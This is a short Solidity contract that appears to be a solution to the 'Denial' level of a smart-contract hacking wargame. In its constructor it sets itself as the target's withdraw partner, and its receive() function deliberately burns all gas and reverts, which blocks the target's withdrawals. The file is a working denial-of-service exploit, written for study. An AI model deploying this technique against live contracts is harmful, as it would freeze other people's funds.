// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../levels/Denial.sol";

contract DenialAttack {
    constructor(address payable _target) public {
        Denial target = Denial(_target);
        target.setWithdrawPartner(address(this));
    }

    receive() external payable {
        // This will consume all the gasleft() and revert
        assert(false);
    }
}
